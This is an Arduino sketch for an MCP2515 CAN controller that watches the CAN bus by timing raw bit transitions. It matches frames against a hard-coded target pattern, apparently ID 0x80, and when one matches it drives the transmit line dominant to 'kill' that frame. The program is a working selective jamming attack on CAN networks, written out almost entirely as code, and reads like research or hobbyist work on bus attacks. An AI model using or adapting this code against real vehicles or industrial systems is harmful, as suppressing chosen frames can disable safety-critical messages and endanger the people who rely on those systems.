#include <Canbus.h>
#include "mcp2515.h"


// Define Joystick connection pins 
#define mcp2515_rx  A4  //black wire
#define mcp2515_tx  A5  //red wire

//Define LED pins
#define LED2 8
#define LED3 7
  uint8_t _receivePin;
  uint8_t _receiveBitMask;
  volatile uint8_t *_receivePortRegister;
  uint8_t _transmitBitMask;
  volatile uint8_t *_transmitPortRegister;
  uint16_t _rx_delay_centering;
  uint16_t _rx_delay_intrabit;
  uint16_t _rx_delay_stopbit;
  uint16_t _tx_delay;
  uint16_t _buffer_overflow;
  uint16_t _inverse_logic;
  
void setRX(uint8_t rx)
{
  pinMode(rx, INPUT);
  //if (!_inverse_logic)
    digitalWrite(rx, HIGH);  // pullup for normal logic!
  _receivePin = rx;
  _receiveBitMask = digitalPinToBitMask(rx);
  uint8_t port = digitalPinToPort(rx);
  _receivePortRegister = portInputRegister(port);
}

uint8_t rx_pin_read()
{
  return *_receivePortRegister & _receiveBitMask;
}

void tx_pin_write(uint8_t pin_state)

{

  if (pin_state == LOW)

    *_transmitPortRegister &= ~_transmitBitMask;

  else

    *_transmitPortRegister |= _transmitBitMask;

}

void setTX(uint8_t tx)

{

  //pinMode(tx, OUTPUT);

  //digitalWrite(tx, HIGH);

  _transmitBitMask = digitalPinToBitMask(tx);

  uint8_t port = digitalPinToPort(tx);

  _transmitPortRegister = portOutputRegister(port);

}


/* static */ 

inline void tunedDelay(uint16_t delay) { 
  uint8_t tmp=0;
  asm volatile("sbiw    %0, 0x01 \n\t"
    "ldi %1, 0xFF \n\t"
    "cpi %A0, 0xFF \n\t"
    "cpc %B0, %1 \n\t"
    "brne .-10 \n\t"
    : "+r" (delay), "+a" (tmp)
    : "0" (delay)
    );
}

//********************************Setup Loop*********************************//
void setup() {
  //Initialize Serial communication for debugging
  Serial.begin(115200);
  Serial.println("mcp2515 tx rx");
  
  //Initialize pins as necessary
  setRX(mcp2515_rx);
  setTX(mcp2515_tx);
  pinMode(mcp2515_tx, INPUT); //redundant. Need to start in HiZ though.
  pinMode(LED2, OUTPUT);
  pinMode(LED3, OUTPUT);
  
  
  //Write LED pins low to turn them off by default
  digitalWrite(LED2, LOW);
  digitalWrite(LED3, LOW);
  
  //Initialize CAN Controller 
  if(Canbus.init(CANSPEED_125))  /* Initialize MCP2515 CAN controller at the specified speed */
  {
    Serial.println("CAN Init Ok");
    delay(1500);
  } 
  else
  {
    Serial.println("Can't init CAN");
    return;
  } 


  //delay(1000); 
  _rx_delay_intrabit=16; //was 15//see bitrates.ods
  _rx_delay_centering=5; //see bitrates.ods
}

#define TRANSMAX 4
uint8_t timetobits[] ={0,0,0,1,1,1,1,1,1,2,
                             2,2,2,2,2,3,3,3,3,3,
                             4,4,4,4,4,4,5,5,5,5};
                         
char target_cmd[48]="4:1 5:1 2:2 5:1 4:1 5:1 5:1 3:1 5:1 5:1 5:1 5:1";
uint8_t target_rawz[]={4,5,2,5,4,5,5,3,5,5,5,5};
uint8_t target_rawo[]={1,1,2,1,1,1,1,1,1,1,1,1};

//********************************Main Loop*********************************//
void loop(){


    uint8_t zc[TRANSMAX];
    uint8_t oc[TRANSMAX];
    uint8_t zcount;
    uint8_t ocount;
    char buf[512];
    uint8_t framegap_bitcount=0;

    noInterrupts();

    // critical, time-sensitive code here
    ocount,zcount=0;   
    while(framegap_bitcount<10) {
      tunedDelay(_rx_delay_intrabit);
      if (rx_pin_read())
          framegap_bitcount++;
      else
          framegap_bitcount=0;
    }    
    while(rx_pin_read()) {}
    for (uint8_t y=0;y<TRANSMAX;y++) {

      zcount=0;        //how many loops until 0 -> 1
      if (ocount==5)
        zcount--;
      while(!rx_pin_read()) {zcount++;}
      zc[y]=zcount;

      
      ocount=0;
      //if (zcount==5)  //how many loop untils 1 -> 0
      //  ocount--;
      while(rx_pin_read()) {ocount++;}
      oc[y]=ocount;

    }
/*
    uint8_t  tindx=0;
    //check against target frame
    for(uint8_t i=0;i<TRANSMAX;i++) {
      if ((target_cmd[tindx]-'0')!=timetobits[zc[i]] ||
          (target_cmd[tindx+2]-'0')!=timetobits[oc[i]]) {
          tindx=0;
          break;
          }
      tindx += 4;
    }
*/
    uint8_t  i,tindx=0;
    //check against target frame  -- faster version
    for(i=0;i<TRANSMAX;i++) {
      if ((target_rawz[i] !=timetobits[zc[i]]) || (target_rawo[i] !=timetobits[oc[i]])) {
              break;
          }
     }
    
    //if there is a match. send noise out to bus to kill frame.
    if (i==TRANSMAX) {
      //kill
        pinMode(mcp2515_tx, OUTPUT);
        tx_pin_write(LOW); // send LOW=1
        for (uint8_t i=0;i<20;i++) {
          tunedDelay(_rx_delay_intrabit);
        }
        tx_pin_write(HIGH); // send HIGH=0
        pinMode(mcp2515_tx, INPUT); //back to HiZ
        digitalWrite(LED2, HIGH);  //give some visual activity feedback
        
    }
    else {
        digitalWrite(LED2, LOW);
    }    
            
    interrupts();
    
    tCAN message;
	
    if (mcp2515_check_message()) {
      if (mcp2515_get_message(&message)) {
           if (message.id==0x80)
            digitalWrite(LED3, HIGH);
           else
             digitalWrite(LED3, LOW);
          /*
           char tmp[80];
           sprintf(tmp," ID:");
           sprintf(tmp + strlen(tmp),"%03X",message.id);
           sprintf(tmp + strlen(tmp)," eID:");
           sprintf(tmp + strlen(tmp),"%01X",message.eid>>16);
           sprintf(tmp + strlen(tmp),"%04X",message.eid);
           sprintf(tmp + strlen(tmp)," rtr:");
           sprintf(tmp + strlen(tmp),"%01X",message.header.rtr);
           sprintf(tmp + strlen(tmp)," len:");
           sprintf(tmp + strlen(tmp),"%01X",message.header.length);
           sprintf(tmp + strlen(tmp)," DAT:");
           for (int _i=0;_i<message.header.length;_i++)
           sprintf(tmp + strlen(tmp),"%02X",message.data[_i]);
            Serial.println(tmp);
           */ 
      }
    }
    

      
/*   
    for(uint8_t y=0;y<TRANSMAX;y++) {
      z=timetobits[zc[y]];
      if (o==5) 
        z--;
     
      for(uint8_t t=z;t;t--) {
        buf[i]='0';
        i++;
      }
      
      o=timetobits[oc[y]];
      
      if (z==5)
        o--;
        
      for(uint8_t t=o;t;t--) {
        buf[i]='1';
        i++;
      }
      
    }
    buf[i]=0;


    for(uint8_t y=0;y<TRANSMAX;y++) {
      Serial.print(timetobits[zc[y]]);
      Serial.print(":");
      Serial.print(timetobits[oc[y]]);
      Serial.print(" ");
    }
  Serial.print("\n");
*/
    //Serial.println(buf); 

}






/*
0=4-5
00=10-11
000-16-17
0000=21-22
00000=27-28

1=4-5
11=12-13
111=16-17
1111=21-22
11111=27-28

timetobits=[0,0,0,1,1,1,1,1,1,2,
            2,2,2,2,2,3,3,3,3,3,
            4,4,4,4,4,4,5,5,5,5];

4:1 5:1 2:2 5:1 4:1 5:1 5:1 3:1 5:1 5:1 5:1 5:1 
/*
000 1000 0000 1100000000111

3:1 7:2 8:3 12:4 14:4 18:5 
 ID:080 eID:00100 rtr:0 len:2 DAT:0000

4:1 6:3 9:4 12:4 13:5 15:5 
 ID:00E eID:00100 rtr:0 len:8 DAT:08901C8A00000000
*/
